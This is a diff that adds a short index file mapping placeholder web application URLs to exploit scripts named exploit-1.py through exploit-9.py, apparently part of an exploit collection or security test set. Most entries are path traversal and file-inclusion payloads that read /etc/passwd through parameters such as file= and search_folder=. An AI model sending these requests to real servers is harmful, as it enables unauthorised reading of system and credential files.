@@ -1,0 +1,17 @@
+url:https://app1.com/pictures/upload.php =>exploit-1.py
+
+url:https://app11.com/ajax_get_file_listing.php?search=1&search_recursively=0&search_name=&search_folder=../../../../../../../../../../../../../../../&limit=10&search_mtime_to=&search_mtime_from=&view=thumbnail& =>exploit-2.py
+
+url:https://app3.com/windows/function.php?file=/etc/passwd& =>exploit-3.py
+
+url:https://app3.com/windows/code.php?file=/etc/passwd& =>exploit-4.py
+
+url:https://app5.com/www/js/scripts.php?load=/etc/passwd& =>exploit-5.py
+
+url:https://app6.com/zimplit.php?action=load1&file=/etc/passwd& =>exploit-6.py
+
+url:https://app7.com/oc-admin/?action=render&page=appearance&file=../../../../../../../../../../../../../../../etc/passwd& =>exploit-7.py
+
+url:https://app9.com/index-test.php/admin/translationManager?file=../../../../../../../../../../../../../../../etc/passwd& =>exploit-9.py
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
